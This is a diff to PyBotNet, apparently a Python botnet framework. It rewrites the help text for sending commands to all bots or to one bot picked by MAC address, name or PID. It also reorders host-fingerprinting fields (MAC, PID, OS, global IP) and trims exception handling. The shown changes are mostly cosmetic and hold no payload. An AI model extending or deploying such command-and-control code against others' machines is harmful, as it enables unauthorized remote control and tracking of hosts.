@@ -13,7 +13,7 @@ import time
 import os
 
 from .context import Context
-from .exceptions import UserException, EngineException
+from .exceptions import UserException
 from .package_info import __version__, __github_link__
 from .utils import get_global_ip, get_host_name_ip
 
@@ -54,12 +54,7 @@ class BotNet:
         self.scripts = {}
         self._debug = debug
         self.__run_time = time.time()
-        self.__cache = {
-            "system_info": {
-                "minimal": {"save_time": None, "data": None},
-                "full": {"save_time": None, "data": None},
-            }
-        }
+        self.__cache = {}
 
         if self.use_default_scripts:
             self.scripts.update(**BotNet.default_scripts)
@@ -134,39 +129,45 @@ class BotNet:
 
 # Run a script:
     
-    - For all bots:
+    - On all bots:
 
     `/[SCRIPT-NAME] [params]`
-        Example: 
-            `/echo hi`
+        Examples:
+            `/echo Hi`
             `/who`
+
 
     - For Select specific bot: 
 
+    + Option 1:
     `[mac-address] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(uuid.getnode())} /echo hi`
-            `{str(uuid.getnode())} /who`
+            `{str(uuid.getnode())} /echo Hi`
 
+    + Option 2:
     `[BOT-NAME] /[SCRIPT-NAME] [params]`
         Example:
-            `{self.BOT_NAME} /echo hi`
-            `{self.BOT_NAME} /who`
+            `{self.BOT_NAME} /echo Hi`
 
+    + Option 3:
     `[pid] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(os.getpid())} {self.BOT_NAME} /echo hi`
-            `{str(os.getpid())} {self.BOT_NAME} /who`
+            `{str(os.getpid())} /echo Hi`
 
+    + Option 4:
     `[mac-address] [pid] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(uuid.getnode())} {str(os.getpid())} /echo hi`
-            `{str(uuid.getnode())} {str(os.getpid())} /who`
+            `{str(uuid.getnode())} {str(os.getpid())} /echo Hi`
 
+    + Option 5:
     `[mac-address] [BOT-NAME] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(uuid.getnode())} {self.BOT_NAME} /echo hi`
-            `{str(uuid.getnode())} {self.BOT_NAME} /who`
+            `{str(uuid.getnode())} {self.BOT_NAME} /echo Hi`
+
+    + Option 6:
+    `[mac-address] [BOT-NAME] [pid] /[SCRIPT-NAME] [params]`
+        Example:
+            `{str(uuid.getnode())} {self.BOT_NAME} {str(os.getpid())} /echo Hi`
 
 
 # PyBotNet version: {__version__}
@@ -218,10 +219,10 @@ class BotNet:
                 return data
 
         minimal_info = {
-            "scripts_name": list(self.scripts),
+            "bot_name": self.BOT_NAME,
             "mac_addres": uuid.getnode(),
             "pid": os.getpid(),
-            "bot_name": self.BOT_NAME,
+            "scripts_name": list(self.scripts),
             "os": platform.system(),
             "global_ip": get_global_ip(),
         }
@@ -289,9 +290,6 @@ class BotNet:
 
             try:
                 command = self.engine.receive()
-            except EngineException as e:
-                _logger.debug(f"Engine[{self.engine}] Error: {e}")
-                command = False
 
             except Exception as e:
                 _logger.debug(f"Engine[{self.engine}] Error: {e}")
